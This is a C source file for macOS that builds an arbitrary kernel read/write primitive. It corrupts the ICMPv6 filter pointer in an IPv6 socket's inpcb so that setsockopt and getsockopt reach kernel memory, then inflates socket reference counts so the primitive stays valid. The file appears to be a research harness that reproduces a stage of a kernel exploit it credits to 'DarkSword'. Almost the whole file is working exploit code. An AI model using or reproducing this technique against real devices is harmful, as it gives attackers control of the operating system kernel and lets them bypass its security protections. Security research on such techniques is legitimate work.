#include <stdio.h>
#include <mach-o/dyld.h>
#include <mach/mach.h>
#include <sys/fileport.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <assert.h>
#include <sys/socket.h>
#include <netinet/icmp6.h>
#include <stdlib.h>
#include "offsets.h"
#include "kextrw.h"
#include "kutils.h"

// from kextrw.c
extern uint64_t gKernelBase;
extern uint64_t gKernelSlide;

// from DarkSword kexploit
#define GETSOCKOPT_READ_LEN 0x20
#define EARLY_KRW_LENGTH 0x20

int g_controlSocket = 0;
int g_rwSocket = 0;
uint8_t g_controlData[EARLY_KRW_LENGTH] = {0, };
uint64_t g_controlSocketPcb = 0;

fileport_t spray_socket(void) {
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd == -1) {
        printf("[-] socket create failed!!!");
        return fd;
    }

    fileport_t outputSocketPort = 0;
    fileport_makeport(fd, &outputSocketPort);
    close(fd);

    return outputSocketPort;
}

uint64_t socketPort_to_inpcb(fileport_t socketPort) {
    uint64_t selfTask = task_self();
    uint64_t fileglob = task_get_ipc_port_kobject(selfTask, socketPort);
    uint64_t socket = kextrw_kreadptr(fileglob + off_fg_data);
    uint64_t inpcb = kextrw_kread64(socket + off_socket_so_pcb);
    return inpcb;
}

void set_target_kaddr(uint64_t where) {
    memset(g_controlData, 0, GETSOCKOPT_READ_LEN);
    *(uint64_t *)g_controlData = where;
    int res = setsockopt(g_controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, g_controlData, EARLY_KRW_LENGTH);
    assert(res == 0);
}

void early_kread(uint64_t where, void *read_buf, size_t size) {
    if (size > EARLY_KRW_LENGTH) {
        printf("[!] error: (size > EARLY_KRW_LENGTH)\n");
        assert(false);
    }
    set_target_kaddr(where);
    socklen_t read_data_length = (socklen_t)size;
    int res = getsockopt(g_rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &read_data_length);
    assert(res == 0);
    return;
}

uint64_t early_kread64(uint64_t where) {
    uint64_t value = 0;
    early_kread(where, &value, sizeof(value));
    return value;
}

void early_kwrite32bytes(uint64_t where, uint8_t writeBuf[EARLY_KRW_LENGTH]) {
    set_target_kaddr(where);
    int res = setsockopt(g_rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH);
    if (res != 0) {
        printf("[-] setsockopt failed!!!");
        assert(false);
    }
}

void early_kwrite64(uint64_t where, uint64_t what) {
    uint8_t writeBuf[EARLY_KRW_LENGTH];
    early_kread(where, writeBuf, EARLY_KRW_LENGTH);
    *(uint64_t *)writeBuf = what;
    early_kwrite32bytes(where, writeBuf);
}

void krw_sockets_leak_forever(uint64_t controlSocketPcb, uint64_t rwSocketPcb) {
    uint64_t controlSocketAddr = early_kread64(controlSocketPcb + off_inpcb_inp_socket);
    // printf("controlSocketPcb + off_inpcb_inp_socket = 0x%llx -> 0x%llx\n", controlSocketPcb + off_inpcb_inp_socket, controlSocketAddr);usleep(50000);

    uint64_t rwSocketAddr = early_kread64(rwSocketPcb + off_inpcb_inp_socket);
    // printf("rwSocketPcb + off_inpcb_inp_socket = 0x%llx -> 0x%llx\n", rwSocketPcb + off_inpcb_inp_socket, rwSocketAddr);usleep(50000);

    if (!controlSocketAddr || !rwSocketAddr) {
        printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
    }

    uint64_t controlSocketSoCount = early_kread64(controlSocketAddr + off_socket_so_usecount);
    // printf("controlSocketAddr + off_socket_so_usecount = 0x%llx -> 0x%llx\n", controlSocketAddr + off_socket_so_usecount, controlSocketSoCount);usleep(50000);

    uint64_t rwSocketSoCount = early_kread64(rwSocketAddr + off_socket_so_usecount);
    // printf("rwSocketAddr + off_socket_so_usecount = 0x%llx -> 0x%llx\n", rwSocketAddr + off_socket_so_usecount, rwSocketSoCount);usleep(50000);

    // Set 0x1001 to socket->so_usecount, socket->so_retaincnt
    early_kwrite64(controlSocketAddr + off_socket_so_usecount,
                   controlSocketSoCount + 0x0000100100001001);
    early_kwrite64(rwSocketAddr + off_socket_so_usecount,
                   rwSocketSoCount + 0x0000100100001001);

    early_kwrite64(rwSocketPcb + off_inpcb_inp_depend6_inp6_chksum, 0);
}

int main(int argc, char *argv[], char *envp[]) {
    offsets_init();
    if(kextrw_init() != 0) {
        printf("kextrw_init() failed!\n");
        while(1) {};
    }
    kextrw_get_kernel_base();

    fileport_t socketPort = spray_socket();
    fileport_t socketPort2 = spray_socket();
    printf("socketPort = 0x%x, socketPort2 = 0x%x\n", socketPort, socketPort2);

    uint64_t inpcb = socketPort_to_inpcb(socketPort);
    uint64_t inpcb2 = socketPort_to_inpcb(socketPort2);
    printf("inpcb = 0x%llx, inpcb2 = 0x%llx\n", inpcb, inpcb2);

    printf("Corrupting inpcb...\n");
    uint64_t nextInpcb = kextrw_kread64(inpcb + off_inpcb_inp_list_le_prev) - off_inpcb_inp_list_le_next;
    assert(nextInpcb == inpcb2);    // should be same with inpcb2
    kextrw_kwrite64(inpcb + off_inpcb_inp_depend6_inp6_icmp6filt, nextInpcb + off_inpcb_inp_depend6_inp6_icmp6filt);
    kextrw_kwrite64(inpcb + off_inpcb_inp_depend6_inp6_chksum, 0);

    printf("Buliding kernel r/w...\n");
    socklen_t len = GETSOCKOPT_READ_LEN;
    void *getsockoptReadData = calloc(1, len);
    int sock = fileport_makefd(socketPort);
    int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockoptReadData, &len);
    assert(res == 0);
    g_controlSocket = sock;
    g_rwSocket = fileport_makefd(socketPort2);

    printf("Testing kernel r/w...\n");
    uint64_t sig = early_kread64(gKernelBase);
    printf("sig = 0x%llx\n", sig);
    assert(sig == 0x100000cfeedfacf);
    uint64_t kptr = kextrw_kalloc(PAGE_SIZE);
    early_kwrite64(kptr, 0x4142434413371338);
    uint64_t val = kextrw_kread64(kptr);
    printf("kptr = 0x%llx -> val: 0x%llx\n", kptr, val);;
    assert(val == 0x4142434413371338);
    kextrw_kfree(kptr, PAGE_SIZE);

    uint64_t controlSocketPcb = early_kread64(nextInpcb + off_inpcb_inp_list_le_next);
    assert(controlSocketPcb == inpcb);  // should be same with inpcb
    krw_sockets_leak_forever(controlSocketPcb, nextInpcb);

    kextrw_deinit();

    puts("done");
    getchar();
    return 0;
}
